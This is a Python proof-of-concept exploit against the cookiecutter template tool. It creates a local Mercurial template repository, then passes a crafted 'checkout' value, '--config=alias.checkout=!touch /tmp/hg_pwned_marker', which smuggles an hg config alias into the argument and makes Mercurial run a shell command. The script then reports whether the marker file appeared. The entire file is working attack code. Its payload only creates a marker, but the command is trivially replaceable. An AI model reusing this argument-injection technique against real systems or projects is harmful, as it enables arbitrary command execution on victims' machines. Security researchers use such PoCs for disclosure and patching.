import os
import subprocess
import traceback
from cookiecutter.main import cookiecutter

def prepare_hg_template(path):
    template_subdir = os.path.join(path, "{{cookiecutter.project_name}}")
    os.makedirs(template_subdir, exist_ok=True)

    with open(os.path.join(path, "cookiecutter.json"), "w") as f:
        f.write('{\n  "project_name": "pwned_project"\n}')

    with open(os.path.join(template_subdir, "README.md"), "w") as f:
        f.write("# Sample project\n")

    subprocess.run(["hg", "init", path], check=True)
    subprocess.run(["hg", "add"], cwd=path, check=True)

    hgrc_path = os.path.join(path, ".hg", "hgrc")
    with open(hgrc_path, "w") as f:
        f.write("[ui]\nusername = exploit <exploit@example.com>\n")

    subprocess.run(["hg", "commit", "-m", "init template with README"], cwd=path, check=True)

def run_poc(template_path):
    checkout_payload = "--config=alias.checkout=!touch /tmp/hg_pwned_marker"
    fake_remote = f"hg+file://{template_path}"

    try:
        cookiecutter(fake_remote, checkout=checkout_payload, no_input=True)
        print("[+] PoC executed. Checking result...")

        if os.path.exists("/tmp/hg_pwned_marker"):
            print("[+] Exploit succeeded! /tmp/hg_pwned_marker created.")
        else:
            print("[-] Exploit failed. Marker not found.")
    except Exception as e:
        print(f"[-] PoC failed: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    template_dir = "/tmp/local_hg_template"

    if not os.path.exists(template_dir):
        print(f"[+] Preparing hg template at {template_dir}")
        prepare_hg_template(template_dir)
    else:
        print(f"[+] Template directory {template_dir} already exists")

    run_poc(template_dir)
